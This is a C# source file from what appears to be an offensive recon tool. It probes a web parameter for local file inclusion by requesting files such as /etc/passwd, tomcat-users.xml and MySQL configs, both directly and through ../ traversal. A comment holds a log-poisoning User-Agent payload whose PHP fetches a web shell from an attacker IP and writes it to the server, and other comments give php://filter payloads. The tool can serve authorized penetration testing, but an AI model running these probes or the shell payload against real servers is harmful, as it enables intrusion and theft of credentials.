using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using ReeCode;

namespace Reecon
{
    class LFI
    {
        private static WebClient wc = new WebClient();
        private static string initialPart = "";
        private static int notFoundLength = 0;
        public static void Scan(string path)
        {
            // Init
            (initialPart, notFoundLength) = InitialChecks(path);

            // Find OS
            var OS = GetOS();
            if (OS == General.OS.Linux)
            {
                // Do Apache2 Checks
                // Apache2 Log Poisoning Path: 
                bool apache2 = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                if (apache2)
                {
                    // Log poisoning file upload
                    // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
                    Console.WriteLine("LFI - Log Poisining File Upload - Bug Reelix");
                }

                // Do MySQL Checks
                List<string> linux_mysql = new List<string>();
                linux_mysql.Add("/etc/my.cnf");
                linux_mysql.Add("/etc/mysql/my.cnf");
                linux_mysql.Add("/var/log/mysql/error.log");
                DoLFI(linux_mysql);

                // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
                List<string> linux_tomcat9 = new List<string>();
                linux_tomcat9.Add("/etc/cron.daily/tomcat9");
                linux_tomcat9.Add("/etc/rsyslog.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/lib/sysusers.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/lib/tmpfiles.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/libexec/tomcat9/tomcat-start.sh");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/server.xml");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/tomcat-users.xml");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/web.xml");
                linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/index.html");
                linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/META-INF/context.xml");
                DoLFI(linux_tomcat9);
            }
            else if (OS == General.OS.Windows)
            {
                // Do IIS Checks
                Console.WriteLine("LFI - Windows - Bug Reelix");
            }
            else
            {
                Console.WriteLine("LFI - Unknown OS - Bug Reelix");
                // Unknown - Do All Checks
            }
            Console.WriteLine("All Checks Done!");
        }

        // Initial Checks
        private static (string, int) InitialChecks(string path)
        {
            Console.WriteLine("Scanning: " + path);
            HttpStatusCode statusCode = wc.GetResponseCode(path);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is a 404 page :(");
                Environment.Exit(0);
            }

            string initialPart = path.Substring(0, path.IndexOf("=") + 1);
            string result = wc.Get(initialPart + "Reelix", null);
            int notFoundLength = result.Length;
            return (initialPart, notFoundLength);
        }

        private static General.OS GetOS()
        {
            // Linux
            List<string> linuxChecks = new List<string>();
            linuxChecks.Add("/etc/passwd");
            linuxChecks.Add("/etc/resolv.conf");
            linuxChecks.Add("/var/www/index.php");
            linuxChecks.Add("/var/www/html/index.php");
            bool hasResult = DoLFI(linuxChecks);
            if (hasResult)
            {
                return General.OS.Linux;
            }

            // Windows
            List<string> windowsChecks = new List<string>();
            windowsChecks.Add("/boot.ini"); // Basic boot.ini
            windowsChecks.Add("/inetpub/wwwroot/index.php"); // Basic IIS Webserver
            windowsChecks.Add("/Windows/debug/NetSetup.log"); // Some basic Windows info
            windowsChecks.Add("/Windows/SoftwareDistribution/ReportingEvents.log"); // Windows Patches
            windowsChecks.Add("/Windows/System32/cmd.exe"); // What Windows box doesn't have cmd?
            windowsChecks.Add("/Windows/win.ini"); // Should have this
            hasResult = DoLFI(windowsChecks);
            if (hasResult)
            {
                return General.OS.Windows;
            }

            return General.OS.Unknown;
        }

        private static bool DoLFI(List<string> lfiChecks)
        {
            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere

            // If it must contain a word
            // php://filter/read=convert.base64-encode/wordhere/resource=flag

            bool hasResult = false;
            foreach (string check in lfiChecks)
            {
                // Check Base
                string toCheck = initialPart + check;
                int resultLength = wc.DownloadString(toCheck).Length;
                if (resultLength != notFoundLength)
                {
                    hasResult = true;
                    Console.WriteLine(toCheck + " - LFI");
                }
                // Check with ../'s
                toCheck = initialPart + "/../../../../.." + check;
                resultLength = wc.DownloadString(toCheck).Length;
                if (resultLength != notFoundLength)
                {
                    hasResult = true;
                    Console.WriteLine(toCheck + " - LFI");
                }
            }
            return hasResult;
        }
    }
}
